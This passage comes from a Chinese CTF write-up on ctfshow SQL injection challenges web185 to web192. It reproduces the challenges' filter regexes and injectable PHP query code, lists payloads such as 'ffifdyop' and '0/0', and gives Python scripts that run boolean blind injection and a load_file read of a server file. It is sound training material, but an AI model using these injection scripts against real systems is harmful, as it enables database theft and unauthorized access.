    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;, $str);
  }
</code></pre><p>这题把数字ban掉了</p>
<p>这其实就导致了我们在构造payload的时候没办法直接使用数字</p>
<p>但是我们可以用true来代替构造出数字</p>
<p>我们知道true = 1</p>
<p>那2就可以用true+true来表示，以此类推</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://33578c7b-f34a-422b-87a5-a8accac68645.challenge.ctf.show/select-waf.php&#34;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">def</span> <span class="nf">createNum</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="n">num</span> <span class="o">+=</span> <span class="s2">&#34;+true&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="n">num</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="s2">&#34;tableName&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s2">)regexp(char(</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="si">}</span><span class="s2">)))&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$user_count = 43;&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]result is:&#34;</span><span class="o">+</span><span class="n">flag</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;}&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">                    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">                <span class="k">break</span>
</span></span></code></pre></div><h4 id="web186">web186<a hidden class="anchor" aria-hidden="true" href="#web186">#</a></h4>
<pre tabindex="0"><code>//对传入的参数进行了过滤
  function waf($str){
    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;, $str);
  }
</code></pre><p>解法和上题一样</p>
<h4 id="web187">web187<a hidden class="anchor" aria-hidden="true" href="#web187">#</a></h4>
<pre tabindex="0"><code>返回逻辑
$username = $_POST[&#39;username&#39;];
$password = md5($_POST[&#39;password&#39;],true);

//只有admin可以获得flag
if($username!=&#39;admin&#39;){
   $ret[&#39;msg&#39;]=&#39;用户名不存在&#39;;
   die(json_encode($ret));
}
      
</code></pre><blockquote>
<p><a href="https://blog.csdn.net/qq_58784379/article/details/120504844">password=md5($pass,true)绕过、弱类型、MD5强碰撞_select * from &lsquo;admin&rsquo; where password=md5($pass,tru-CSDN博客</a></p>
<p><img alt="image-20250209180556787" loading="lazy" src="../assets/image-20250209180556787.png"></p>
<p><img alt="image-20250209180634255" loading="lazy" src="../assets/image-20250209180634255.png"></p></blockquote>
<p>payload:</p>
<pre tabindex="0"><code>admin/ffifdyop
</code></pre><p><img alt="image-20250209181202696" loading="lazy" src="../assets/image-20250209181202696.png"></p>
<p>抓个包</p>
<h4 id="web188">web188<a hidden class="anchor" aria-hidden="true" href="#web188">#</a></h4>
<pre tabindex="0"><code>查询语句

  //拼接sql语句查找指定ID用户
  $sql = &#34;select pass from ctfshow_user where username = {$username}&#34;;
</code></pre><pre tabindex="0"><code>返回逻辑


  //用户名检测
  if(preg_match(&#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#39;|\&#34;/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret[&#39;msg&#39;]=&#39;密码只能为数字&#39;;
    die(json_encode($ret));
  }

  //密码判断
  if($row[&#39;pass&#39;]==intval($password)){
      $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;
      array_push($ret[&#39;data&#39;], array(&#39;flag&#39;=&gt;$flag));
    }
      
</code></pre><blockquote>
<p><img alt="image-20250209215646783" loading="lazy" src="../assets/image-20250209215646783.png"></p>
<p><a href="https://blog.csdn.net/qq_50589021/article/details/119426002">ctfshow-sql注入-超详解(172-200)_ctfshow 172-CSDN博客</a></p></blockquote>
<p>所以payload为</p>
<pre tabindex="0"><code>0/0
或者
1||1/0
</code></pre><p><a href="https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v">https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v</a></p>
<h4 id="web189">web189<a hidden class="anchor" aria-hidden="true" href="#web189">#</a></h4>
<pre tabindex="0"><code>  //拼接sql语句查找指定ID用户
  $sql = &#34;select pass from ctfshow_user where username = {$username}&#34;;
</code></pre><pre tabindex="0"><code>
  //用户名检测
  if(preg_match(&#39;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret[&#39;msg&#39;]=&#39;密码只能为数字&#39;;
    die(json_encode($ret));
  }

  //密码判断
  if($row[&#39;pass&#39;]==$password){
      $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;
    }
     
</code></pre><p>这题在输入0/0的时候会显示密码错误，而在输入1/0的时候则会显示查询错误</p>
<p>可以通过这个来进行布尔盲注，即正确时系统返回查询错误，错误时系统返回密码错误</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># @Author  : Yn8rt</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"># @Time    : 2021/7/30 15:48</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># @Function:</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://98e1809d-5de9-4f68-b45f-d03388b1dae8.challenge.ctf.show/api/&#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;ctfshow{&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">letter</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyz-</span><span class="si">{}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;if(load_file(&#39;/var/www/html/api/index.php&#39;)regexp(&#39;</span><span class="si">{}</span><span class="s2">&#39;),0,1)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="n">j</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1">#print(r)</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span> <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">if</span> <span class="s1">&#39;}&#39;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="web190">web190<a hidden class="anchor" aria-hidden="true" href="#web190">#</a></h4>
<p>查询语句</p>
<pre tabindex="0"><code>  //拼接sql语句查找指定ID用户
  $sql = &#34;select pass from ctfshow_user where username = &#39;{$username}&#39;&#34;;
      
</code></pre><p>返回逻辑</p>
<pre tabindex="0"><code>  //密码检测
  if(!is_numeric($password)){
    $ret[&#39;msg&#39;]=&#39;密码只能为数字&#39;;
    die(json_encode($ret));
  }

  //密码判断
  if($row[&#39;pass&#39;]==$password){
      $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;
    }

  //TODO:感觉少了个啥，奇怪
      
</code></pre><p><img alt="image-20250209225336696" loading="lazy" src="../assets/image-20250209225336696.png"></p>
<p>所以这题依旧可以进行布尔盲注</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://eb2e57dd-6c44-4140-9052-f549f647caa9.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># 查数据库</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查字段</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 查flag</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_fl0g&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,2)=&#39;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span>  <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web191">web191<a hidden class="anchor" aria-hidden="true" href="#web191">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>这题和上题一样，只是加了点ban掉了ascii</p>
<p>我们用ord代替ascii即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://92a52ee7-65ff-4fff-b3d9-ec90f74fd2f5.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># 查数据库</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查字段</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 查flag</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_fl0g&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(ord(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,2)=&#39;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span>  <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web192">web192<a hidden class="anchor" aria-hidden="true" href="#web192">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
